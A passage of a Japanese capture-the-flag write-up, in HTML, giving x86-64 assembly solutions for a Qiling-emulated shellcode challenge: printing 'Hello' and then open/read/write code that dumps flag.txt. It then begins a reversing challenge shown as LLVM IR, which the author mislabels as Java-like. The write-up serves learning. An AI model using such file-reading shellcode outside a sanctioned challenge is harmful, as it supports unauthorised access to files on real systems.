            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/36d70c9a9cce9027cd901571c07d8345/d9199/image-20240616105855558.png"
            alt="image-20240616105855558"
            title="image-20240616105855558"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h3 id="stage-3" style="position:relative;"><a href="#stage-3" aria-label="stage 3 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Stage 3</h3>
<p>Stage 3 では、標準出力に <code class="language-text">Hello</code> という文字列を出力させることがクリア条件でした。</p>
<p>この条件は以下のアセンブリコードでクリアできました。</p>
<p>このコードではリトルエンディアン形式にした文字列 <code class="language-text">olleH(0x6f6c6c6548)</code> をスタックトップに配置した後、そのアドレスを RSI に渡し、 Syscall 番号 1 の write を使用して標準出力に文字列 <code class="language-text">Hello</code> を出力するコードです。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">mov rax, <span class="token number">1</span>
mov rdi, <span class="token number">1</span>
mov rbx, 0x6f6c6c6548
push rbx
mov rsi, rsp
mov rdx, <span class="token number">5</span>
syscall</code></pre></div>
<p>参考：<a href="https://manpages.debian.org/unstable/manpages-dev/write.2.en.html" target="_blank" rel="nofollow noopener noreferrer">write(2) — manpages-dev — Debian unstable — Debian Manpages</a></p>
<p>参考：<a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="nofollow noopener noreferrer">Searchable Linux Syscall Table for x86_64</a></p>
<p>解法自体はシンプルですが、このアセンブリコードにたどり着くまでに何か所かハマったポイントがありました。</p>
<p>まず、最初に作成したコードでは <code class="language-text">push 0x6f6c6c6548</code> にてスタックトップに即値で 0x6f6c6c6548 を格納しようとした際、以下のようなエラーが出力されました。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> There was an error running <span class="token punctuation">[</span><span class="token string">'/usr/bin/x86_64-linux-gnu-as'</span>, <span class="token string">'-64'</span>, <span class="token string">'-o'</span>, <span class="token string">'/tmp/pwn-asm-ong0t78p/step2'</span>, <span class="token string">'/tmp/pwn-asm-ong0t78p/step1'</span><span class="token punctuation">]</span>:
    It had the exitcode <span class="token number">1</span>.
    It had this on stdout:
    /tmp/pwn-asm-ong0t78p/step1: Assembler messages:
    /tmp/pwn-asm-ong0t78p/step1:10: Error: operand <span class="token builtin class-name">type</span> mismatch <span class="token keyword">for</span> <span class="token variable"><span class="token variable">`</span>push<span class="token string">'

[ERROR] An error occurred while assembling:
       1: .section .shellcode,"awx"
       2: .global _start
       3: .global __start
       4: .p2align 2
       5: _start:
       6: __start:
       7: .intel_syntax noprefix
       8: mov rax, 1
       9: mov rdi, 1
      10: push 0x6f6c6c6548
      11: mov rsi, rsp
      12: mov rdx, 9
      13: syscall
    Traceback (most recent call last):
      File "/usr/local/lib/python3.10/dist-packages/pwnlib/asm.py", line 701, in asm
        _run(assembler + ['</span>-o<span class="token string">', step2, step1])
      File "/usr/local/lib/python3.10/dist-packages/pwnlib/asm.py", line 419, in _run
        log.error(msg, *args)
      File "/usr/local/lib/python3.10/dist-packages/pwnlib/log.py", line 439, in error
        raise PwnlibException(message % args)
    pwnlib.exception.PwnlibException: There was an error running ['</span>/usr/bin/x86_64-linux-gnu-as<span class="token string">', '</span>-64<span class="token string">', '</span>-o<span class="token string">', '</span>/tmp/pwn-asm-ong0t78p/step2<span class="token string">', '</span>/tmp/pwn-asm-ong0t78p/step1'<span class="token punctuation">]</span>:
    It had the exitcode <span class="token number">1</span>.
    It had this on stdout:
    /tmp/pwn-asm-ong0t78p/step1: Assembler messages:
    /tmp/pwn-asm-ong0t78p/step1:10: Error: operand <span class="token builtin class-name">type</span> mismatch <span class="token keyword">for</span> <span class="token variable">`</span></span>push'</code></pre></div>
<p>これは、push 命令が 64bit サイズの即値のオペランドに対応していないために出力されているエラーのようです。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 505px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/78bd6dc3dbff13fe3c95fa69176143b6/c0cb9/image-20240616112338492.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 35.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABWklEQVQozz2R23KCMBCGeea+Wa+d6XULpQUcq1M51KmcwlEQIYD83WzVzITZbJZvvySabrzBsS2YhgHTNPFhWTDeDdiU098M6PorLMuG9WnhZbXC13aLaZpwvV5xH8uyYLnFmpQSXdfxVHHf9xjHkdZnmhfIYeC8mue2RdM0DFDAcZQMV2OeZ441tbHbbeG6HmaKD4cANhn5tD4TsK4rrNcO9t8usixHEsdwHFq7e1RVCd/3sdls4FF9VdXQlI0Qgjv2/QDfi+F6AX6PRyRpgrZtEEURGY5sVpYF5VNurv4RFBdFyXtsqICnU83aXZfhJ3gmmI/wGCLPc76KmKymab4BS4gs41gdU6SCzdS4ASUlCioA2QR0/CcC7KlrTQYzWrqzMIy4WEGKImfDOzBNEm7yAM70ESKFJNO+l2Q1UCG92vJ/pAsZ5nnxeNmmOaGsKo4VsCLY/aFUzR8qIxJBpXPoQwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/78bd6dc3dbff13fe3c95fa69176143b6/8ac56/image-20240616112338492.webp 240w,
/static/78bd6dc3dbff13fe3c95fa69176143b6/d3be9/image-20240616112338492.webp 480w,
/static/78bd6dc3dbff13fe3c95fa69176143b6/c5db7/image-20240616112338492.webp 505w"
              sizes="(max-width: 505px) 100vw, 505px"
              type="image/webp"
            />
          <source
            srcset="/static/78bd6dc3dbff13fe3c95fa69176143b6/8ff5a/image-20240616112338492.png 240w,
/static/78bd6dc3dbff13fe3c95fa69176143b6/e85cb/image-20240616112338492.png 480w,
/static/78bd6dc3dbff13fe3c95fa69176143b6/c0cb9/image-20240616112338492.png 505w"
            sizes="(max-width: 505px) 100vw, 505px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/78bd6dc3dbff13fe3c95fa69176143b6/c0cb9/image-20240616112338492.png"
            alt="image-20240616112338492"
            title="image-20240616112338492"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>参考：<a href="https://www.felixcloutier.com/x86/push" target="_blank" rel="nofollow noopener noreferrer">PUSH — Push Word, Doubleword, or Quadword Onto the Stack</a></p>
<p>参考：<a href="https://github.com/Gallopsled/pwntools/issues/1228" target="_blank" rel="nofollow noopener noreferrer">Does pwntools cannot asm() format like ” push 64bit-number” · Issue #1228 · Gallopsled/pwntools</a></p>
<p>そのため、同じアセンブリコードで <code class="language-text">push 0x6c6c6548</code> を使用して文字列 <code class="language-text">Hell</code> を出力することは可能でした。</p>
<p>この問題を回避するために、一度任意のレジスタに値を格納した後にそのレジスタの値を push することで 64bit の値をスタックトップに格納しています。</p>
<p>ちなみに、以下のようにしない理由は、この方法を利用してもスタック自体は 64bit のサイズで確保されるため、実際に出力できる文字列が <code class="language-text">Hell\x00\x00o</code> となってしまうためです。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">push 0x0000006f
push 0x6c6c6548</code></pre></div>
<h3 id="stage-4" style="position:relative;"><a href="#stage-4" aria-label="stage 4 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Stage 4</h3>
<p>Stage 4 に到達できたので、いよいよ Flag を取得します。</p>
<p>問題バイナリを読むとわかる通り Stage 4 に到達するとランダムな UUID で作成されたディレクトリ内に flag.txt が作成されます。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">dirname <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>dirname<span class="token punctuation">)</span>
<span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"4"</span><span class="token punctuation">:</span>
    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>dirname<span class="token punctuation">,</span> <span class="token string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">,</span> <span class="token string">"ctf4b{fake_flag}"</span><span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

ql <span class="token operator">=</span> Qiling<span class="token punctuation">(</span>
    code<span class="token operator">=</span>asm_code<span class="token punctuation">,</span>
    rootfs<span class="token operator">=</span>dirname<span class="token punctuation">,</span>
    archtype<span class="token operator">=</span>QL_ARCH<span class="token punctuation">.</span>X8664<span class="token punctuation">,</span>
    ostype<span class="token operator">=</span>QL_OS<span class="token punctuation">.</span>LINUX<span class="token punctuation">,</span>
    verbose<span class="token operator">=</span>QL_VERBOSE<span class="token punctuation">.</span>DEFAULT<span class="token punctuation">,</span>
    log_file<span class="token operator">=</span>logpath<span class="token punctuation">,</span>
<span class="token punctuation">)</span></code></pre></div>
<p>このディレクトリは、Qiling の引数の <code class="language-text">rootfs=dirname</code> で示されている通り、実行時のルートディレクトリになります。</p>
<p>参考：<a href="https://docs.qiling.io/en/latest/qltool/#run-options" target="_blank" rel="nofollow noopener noreferrer">qltool - Qiling Framework Documentation</a></p>
<p>そのため、単に flag.txt を開いて中身を読み取り、出力することで Flag を取得できそうだということがわかります。</p>
<p>Solver は以下のようになります。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">mov rax, 0x7478742e67616c66
push 0x0
push rax
mov rax, <span class="token number">2</span>
mov rdi, rsp
mov rsi, <span class="token number">0</span>
mov rdx, <span class="token number">0</span>
syscall

mov rdi, rax
mov rax, <span class="token number">0</span>
mov rsi, rsp
mov rdx, <span class="token number">53</span>
syscall

mov rax, <span class="token number">1</span>
mov rdi, <span class="token number">1</span>
mov rsi, rsp
mov rdx, <span class="token number">53</span>
syscall</code></pre></div>
<p>使用しているシステムコールは、上から順に open、read、write です。</p>
<p>これで正しい Flag を特定することができました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/b22abdcaae0658056c62601c0f3aa594/fe238/image-20240615155952218.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 68.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACbklEQVQ4y43SSW/TQBgG4IlTmi6khHi3EzuJ7exOGmdxW9KS0HRNqVQom4B7qVAlLnDihMRyQQIKqCqbhMSvAHHmV70dO1YFbSkcHn0zn0avP3tMDKsIM1uEkkiB5SVwgkKr7OME2d/zovpXgpRAnJ55PLOKD70bILKqQ0uZ0HQTetpCQjf8qqUsJGlfTab9YN4LDnD0wSwr/GE8FsfoeRZETRqwcjadsoyMVfKljQIkRYcoa3SCpD8lJ6iHRDUFOZ2D8ptEpgBFM0H0dAmFch2SmqGHNfCSDk6kVUgGaCjdi7Qfi8uoVVtY2nmC7vvvWN7/iSXP3g/0v/7C9MNXXmAeppUPvpt0+P2O4kUFZ8/F0ai7qC7fQrhzB8Ozm2Baawi762BmNhCpdEBSmSLKFce/lDgnBa93nHcB0RiHyWoDxe4GmPZ1DNMQUp0fqC3iTH4KRNNzsOiE3gSDmz09sDbZQH7hGkj3NkYo0uiD1FdAWpcxVJr1JsyhWLYhKsngt5FP5D0wGmPhOC7K7UUMZZuYqF7EaK6JkWwdkVwL4xkbJGM2USg0wfM0kE2A4wb1KK8/MSGgUpmGXXIQHYuCoxOzFBfj/crGBZB8cwumcwW8rkI2s5AM8zjTGqBr2cpSFkS/HzAMvwqpNIh1swd37z7ct9tw351g9x5aAX/9ZsDd3T7st15vYXp/B/aDqyBcyQLfc8B3JsF3az6RErz9JQdsuwL2gn26GWqWnqvlQcbuboJ8eQHm0zOEPj/3MYEQ7TH/4+NThL69ROTRFg2s2WDW5xFe7SC8Qq11B+s+rUtzCC+0/63XBrM8h8iUgwObVanAdOruoAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/b22abdcaae0658056c62601c0f3aa594/8ac56/image-20240615155952218.webp 240w,
/static/b22abdcaae0658056c62601c0f3aa594/d3be9/image-20240615155952218.webp 480w,
/static/b22abdcaae0658056c62601c0f3aa594/e46b2/image-20240615155952218.webp 960w,
/static/b22abdcaae0658056c62601c0f3aa594/9d46a/image-20240615155952218.webp 1401w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/b22abdcaae0658056c62601c0f3aa594/8ff5a/image-20240615155952218.png 240w,
/static/b22abdcaae0658056c62601c0f3aa594/e85cb/image-20240615155952218.png 480w,
/static/b22abdcaae0658056c62601c0f3aa594/d9199/image-20240615155952218.png 960w,
/static/b22abdcaae0658056c62601c0f3aa594/fe238/image-20240615155952218.png 1401w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/b22abdcaae0658056c62601c0f3aa594/d9199/image-20240615155952218.png"
            alt="image-20240615155952218"
            title="image-20240615155952218"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>思った通りにアセンブリコードが動かない場合は、verbose の値を <code class="language-text">QL_VERBOSE.DEBUG</code> に変更してローカルで試してみるとよいです。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">ql <span class="token operator">=</span> Qiling<span class="token punctuation">(</span>
    code<span class="token operator">=</span>asm_code<span class="token punctuation">,</span>
    rootfs<span class="token operator">=</span>dirname<span class="token punctuation">,</span>
    archtype<span class="token operator">=</span>QL_ARCH<span class="token punctuation">.</span>X8664<span class="token punctuation">,</span>
    ostype<span class="token operator">=</span>QL_OS<span class="token punctuation">.</span>LINUX<span class="token punctuation">,</span>
    verbose<span class="token operator">=</span>QL_VERBOSE<span class="token punctuation">.</span>DEBUG<span class="token punctuation">,</span>
<span class="token punctuation">)</span></code></pre></div>
<p>デバッグモードを有効化すると、以下のようにシステムコールの呼び出しや結果などの詳細な情報を簡単に参照できるので便利です。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/78f2f657426df1b560115864ec16bc73/faa22/image-20240616114006163.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA30lEQVQY052R3W6DMAyFw39IgHQhhA7aSaUdu9ombXv/VzuzXcG0214cObaT48+KOr+c8breMJ9mxBjRdR2stVBKPSY2+/75wvV2xcfnO9a3FdP0DB50oiE8aJonhNDDNhbGGNR1LUNZf/k9qjAEeewObi8aUwtp0zZi0pDKskSSJLvSNBVt5zzPkWUZ1HiMRLegJwKtNQyZVroSg6oqJRZFce8RzUbFuaZ7DCFG28pMuCwXMWzbFuNxxEA17z0ORO39k0S+N8SBVg/S5w245pwTwt3Q954+YxCyf40H9QsUJ4c+V/pHhgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/78f2f657426df1b560115864ec16bc73/8ac56/image-20240616114006163.webp 240w,
/static/78f2f657426df1b560115864ec16bc73/d3be9/image-20240616114006163.webp 480w,
/static/78f2f657426df1b560115864ec16bc73/e46b2/image-20240616114006163.webp 960w,
/static/78f2f657426df1b560115864ec16bc73/f992d/image-20240616114006163.webp 1440w,
/static/78f2f657426df1b560115864ec16bc73/2dde2/image-20240616114006163.webp 1509w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/78f2f657426df1b560115864ec16bc73/8ff5a/image-20240616114006163.png 240w,
/static/78f2f657426df1b560115864ec16bc73/e85cb/image-20240616114006163.png 480w,
/static/78f2f657426df1b560115864ec16bc73/d9199/image-20240616114006163.png 960w,
/static/78f2f657426df1b560115864ec16bc73/07a9c/image-20240616114006163.png 1440w,
/static/78f2f657426df1b560115864ec16bc73/faa22/image-20240616114006163.png 1509w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/78f2f657426df1b560115864ec16bc73/d9199/image-20240616114006163.png"
            alt="image-20240616114006163"
            title="image-20240616114006163"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h2 id="cha-ll-engerev" style="position:relative;"><a href="#cha-ll-engerev" aria-label="cha ll engerev permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cha-ll-enge(Rev)</h2>
<blockquote>
<p>見たことがない形式のファイルだけど、中身を見れば何かわかるかも…?</p>
</blockquote>
<p>問題バイナリは以下のような Java の中間言語のようなソースです。</p>
<p>ぱっと見で <code class="language-text">@__const.main.key</code> に定義されている値を 1 文字ずつ Flag と XOR して次の Key との XOR が 0 になるかどうかを調べるだけの処理を行っていることがわかります。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">@__const.main.key <span class="token operator">=</span> private unnamed_addr constant <span class="token punctuation">[</span><span class="token number">50</span> x i32<span class="token punctuation">]</span> <span class="token punctuation">[</span>i32 <span class="token number">119</span>, i32 <span class="token number">20</span>, i32 <span class="token number">96</span>, i32 <span class="token number">6</span>, i32 <span class="token number">50</span>, i32 <span class="token number">80</span>, i32 <span class="token number">43</span>, i32 <span class="token number">28</span>, i32 <span class="token number">117</span>, i32 <span class="token number">22</span>, i32 <span class="token number">125</span>, i32 <span class="token number">34</span>, i32 <span class="token number">21</span>, i32 <span class="token number">116</span>, i32 <span class="token number">23</span>, i32 <span class="token number">124</span>, i32 <span class="token number">35</span>, i32 <span class="token number">18</span>, i32 <span class="token number">35</span>, i32 <span class="token number">85</span>, i32 <span class="token number">56</span>, i32 <span class="token number">103</span>, i32 <span class="token number">14</span>, i32 <span class="token number">96</span>, i32 <span class="token number">20</span>, i32 <span class="token number">39</span>, i32 <span class="token number">85</span>, i32 <span class="token number">56</span>, i32 <span class="token number">93</span>, i32 <span class="token number">57</span>, i32 <span class="token number">8</span>, i32 <span class="token number">60</span>, i32 <span class="token number">72</span>, i32 <span class="token number">45</span>, i32 <span class="token number">114</span>, i32 <span class="token number">0</span>, i32 <span class="token number">101</span>, i32 <span class="token number">21</span>, i32 <span class="token number">103</span>, i32 <span class="token number">84</span>, i32 <span class="token number">39</span>, i32 <span class="token number">66</span>, i32 <span class="token number">44</span>, i32 <span class="token number">27</span>, i32 <span class="token number">122</span>, i32 <span class="token number">77</span>, i32 <span class="token number">36</span>, i32 <span class="token number">20</span>, i32 <span class="token number">122</span>, i32 <span class="token number">7</span><span class="token punctuation">]</span>, align <span class="token number">16</span>
@.str <span class="token operator">=</span> private unnamed_addr constant <span class="token punctuation">[</span><span class="token number">14</span> x i8<span class="token punctuation">]</span> c<span class="token string">"Input FLAG : <span class="token entity" title="\00">\00</span>"</span>, align <span class="token number">1</span>
@.str.1 <span class="token operator">=</span> private unnamed_addr constant <span class="token punctuation">[</span><span class="token number">3</span> x i8<span class="token punctuation">]</span> c<span class="token string">"%s<span class="token entity" title="\00">\00</span>"</span>, align <span class="token number">1</span>
@.str.2 <span class="token operator">=</span> private unnamed_addr constant <span class="token punctuation">[</span><span class="token number">22</span> x i8<span class="token punctuation">]</span> c<span class="token string">"Correct! FLAG is %s.<span class="token entity" title="\0">\0</span>A<span class="token entity" title="\00">\00</span>"</span>, align <span class="token number">1</span>
@.str.3 <span class="token operator">=</span> private unnamed_addr constant <span class="token punctuation">[</span><span class="token number">16</span> x i8<span class="token punctuation">]</span> c<span class="token string">"Incorrect FLAG.<span class="token entity" title="\00">\00</span>"</span>, align <span class="token number">1</span>

<span class="token punctuation">;</span> Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#0 {</span>
  %1 <span class="token operator">=</span> alloca i32, align <span class="token number">4</span>
  %2 <span class="token operator">=</span> alloca <span class="token punctuation">[</span><span class="token number">70</span> x i8<span class="token punctuation">]</span>, align <span class="token number">16</span>
  %3 <span class="token operator">=</span> alloca <span class="token punctuation">[</span><span class="token number">50</span> x i32<span class="token punctuation">]</span>, align <span class="token number">16</span>
  %4 <span class="token operator">=</span> alloca i32, align <span class="token number">4</span>
  %5 <span class="token operator">=</span> alloca i32, align <span class="token number">4</span>
  %6 <span class="token operator">=</span> alloca i64, align <span class="token number">8</span>
  store i32 <span class="token number">0</span>, i32* %1, align <span class="token number">4</span>
  %7 <span class="token operator">=</span> bitcast <span class="token punctuation">[</span><span class="token number">50</span> x i32<span class="token punctuation">]</span>* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64<span class="token punctuation">(</span>i8* align <span class="token number">16</span> %7, i8* align <span class="token number">16</span> bitcast <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">50</span> x i32<span class="token punctuation">]</span>* @__const.main.key to i8*<span class="token punctuation">)</span>, i64 <span class="token number">200</span>, i1 <span class="token boolean">false</span><span class="token punctuation">)</span>
  %8 <span class="token operator">=</span> call i32 <span class="token punctuation">(</span>i8*, <span class="token punctuation">..</span>.<span class="token punctuation">)</span> @printf<span class="token punctuation">(</span>i8* noundef getelementptr inbounds <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">14</span> x i8<span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token number">14</span> x i8<span class="token punctuation">]</span>* @.str, i64 <span class="token number">0</span>, i64 <span class="token number">0</span><span class="token punctuation">))</span>
  %9 <span class="token operator">=</span> getelementptr inbounds <span class="token punctuation">[</span><span class="token number">70</span> x i8<span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token number">70</span> x i8<span class="token punctuation">]</span>* %2, i64 <span class="token number">0</span>, i64 <span class="token number">0</span>
  %10 <span class="token operator">=</span> call i32 <span class="token punctuation">(</span>i8*, <span class="token punctuation">..</span>.<span class="token punctuation">)</span> @__isoc99_scanf<span class="token punctuation">(</span>i8* noundef getelementptr inbounds <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span> x i8<span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token number">3</span> x i8<span class="token punctuation">]</span>* @.str.1, i64 <span class="token number">0</span>, i64 <span class="token number">0</span><span class="token punctuation">)</span>, i8* noundef %9<span class="token punctuation">)</span>
  %11 <span class="token operator">=</span> getelementptr inbounds <span class="token punctuation">[</span><span class="token number">70</span> x i8<span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token number">70</span> x i8<span class="token punctuation">]</span>* %2, i64 <span class="token number">0</span>, i64 <span class="token number">0</span>
  %12 <span class="token operator">=</span> call i64 @strlen<span class="token punctuation">(</span>i8* noundef %11<span class="token punctuation">)</span> <span class="token comment">#4</span>
  %13 <span class="token operator">=</span> icmp eq i64 %12, <span class="token number">49</span>
  br i1 %13, label %14, label %48

<span class="token number">14</span>:                                               <span class="token punctuation">;</span> preds <span class="token operator">=</span> %0
  store i32 <span class="token number">0</span>, i32* %4, align <span class="token number">4</span>
  store i32 <span class="token number">0</span>, i32* %5, align <span class="token number">4</span>
  store i64 <span class="token number">0</span>, i64* %6, align <span class="token number">8</span>
  br label %15

<span class="token number">15</span>:                                               <span class="token punctuation">;</span> preds <span class="token operator">=</span> %38, %14
  %16 <span class="token operator">=</span> load i64, i64* %6, align <span class="token number">8</span>
  %17 <span class="token operator">=</span> icmp ult i64 %16, <span class="token number">49</span>
  br i1 %17, label %18, label %41

<span class="token number">18</span>:                                               <span class="token punctuation">;</span> preds <span class="token operator">=</span> %15
  %19 <span class="token operator">=</span> load i64, i64* %6, align <span class="token number">8</span>
  %20 <span class="token operator">=</span> getelementptr inbounds <span class="token punctuation">[</span><span class="token number">70</span> x i8<span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token number">70</span> x i8<span class="token punctuation">]</span>* %2, i64 <span class="token number">0</span>, i64 %19
  %21 <span class="token operator">=</span> load i8, i8* %20, align <span class="token number">1</span>
  %22 <span class="token operator">=</span> sext i8 %21 to i32
  %23 <span class="token operator">=</span> load i64, i64* %6, align <span class="token number">8</span>
  %24 <span class="token operator">=</span> getelementptr inbounds <span class="token punctuation">[</span><span class="token number">50</span> x i32<span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token number">50</span> x i32<span class="token punctuation">]</span>* %3, i64 <span class="token number">0</span>, i64 %23
  %25 <span class="token operator">=</span> load i32, i32* %24, align <span class="token number">4</span>
  %26 <span class="token operator">=</span> xor i32 %22, %25
  %27 <span class="token operator">=</span> load i64, i64* %6, align <span class="token number">8</span>
  %28 <span class="token operator">=</span> <span class="token function">add</span> i64 %27, <span class="token number">1</span>
  %29 <span class="token operator">=</span> getelementptr inbounds <span class="token punctuation">[</span><span class="token number">50</span> x i32<span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token number">50</span> x i32<span class="token punctuation">]</span>* %3, i64 <span class="token number">0</span>, i64 %28
  %30 <span class="token operator">=</span> load i32, i32* %29, align <span class="token number">4</span>
  %31 <span class="token operator">=</span> xor i32 %26, %30
  store i32 %31, i32* %5, align <span class="token number">4</span>
  %32 <span class="token operator">=</span> load i32, i32* %5, align <span class="token number">4</span>
  %33 <span class="token operator">=</span> icmp eq i32 %32, <span class="token number">0</span>
  br i1 %33, label %34, label %37

<span class="token number">34</span>:                                               <span class="token punctuation">;</span> preds <span class="token operator">=</span> %18
  %35 <span class="token operator">=</span> load i32, i32* %4, align <span class="token number">4</span>
  %36 <span class="token operator">=</span> <span class="token function">add</span> nsw i32 %35, <span class="token number">1</span>
  store i32 %36, i32* %4, align <span class="token number">4</span>
  br label %37

<span class="token number">37</span>:                                               <span class="token punctuation">;</span> preds <span class="token operator">=</span> %34, %18
  br label %38

<span class="token number">38</span>:                                               <span class="token punctuation">;</span> preds <span class="token operator">=</span> %37
  %39 <span class="token operator">=</span> load i64, i64* %6, align <span class="token number">8</span>
  %40 <span class="token operator">=</span> <span class="token function">add</span> i64 %39, <span class="token number">1</span>
  store i64 %40, i64* %6, align <span class="token number">8</span>
